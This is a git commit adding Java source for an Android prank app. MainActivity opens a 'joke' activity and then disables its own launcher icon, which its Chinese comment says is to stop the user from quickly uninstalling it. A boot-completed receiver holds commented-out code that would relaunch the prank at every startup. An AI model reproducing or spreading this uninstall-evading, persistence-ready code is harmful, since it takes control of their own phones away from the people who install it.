67a9a0c5e4dcfd2ff576608e585039e5955edfd5
muzihuaner <muzihuaner@hotamil.com>
2021-11-05 19:05:41 +0800

    提交

---
+++ app/src/main/java/com/fuck/babybisi/JokeServer.java
@@ -0,0 +1,22 @@
+package com.fuck.babybisi;
+import android.app.*;
+import android.os.*;
+import android.content.*;
+
+public class JokeServer extends BroadcastReceiver
+{
+	static final String action_boot="android.intent.action.BOOT_COMPLETED";
+	
+	@Override
+	public void onReceive(Context context, Intent intent)
+	{
+		/*if (intent.getAction().equals(action_boot)){
+			Intent startIntent=new Intent(context,JokeActivity.class); //接收到广播后，跳转JokeActivity
+			context.startActivity(startIntent);
+		}*/
+	}
+	
+
+	
+	
+}
---
+++ app/src/main/java/com/fuck/babybisi/MainActivity.java
@@ -0,0 +1,34 @@
+package com.fuck.babybisi;
+
+import android.app.*;
+import android.content.*;
+import android.content.pm.*;
+import android.os.*;
+
+public class MainActivity extends Activity 
+{
+//用于跳转恶搞活动，并隐藏启动图标
+	@Override
+	protected void onCreate(Bundle savedInstanceState)
+	{
+		super.onCreate(savedInstanceState);
+		//跳转恶搞活动
+		startActivity(new Intent(this,JokeActivity.class));
+		//隐藏启动图标，让用户无法快速卸载
+		hideIcon();
+	}
+	
+	 void hideIcon() {
+        PackageManager packageManager =getPackageManager();// 获取PackageManager
+        ComponentName componentName = new ComponentName(this, MainActivity.class);// 获取类名对于的组件名称
+        int componentState = packageManager
+			.getComponentEnabledSetting(componentName);// 返回组件的启动状态
+        if (componentState == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
+			|| componentState == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+			//隐藏启动图标
+            packageManager.setComponentEnabledSetting(componentName,
+													  PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+													  PackageManager.DONT_KILL_APP);
+        }
+    }
+}
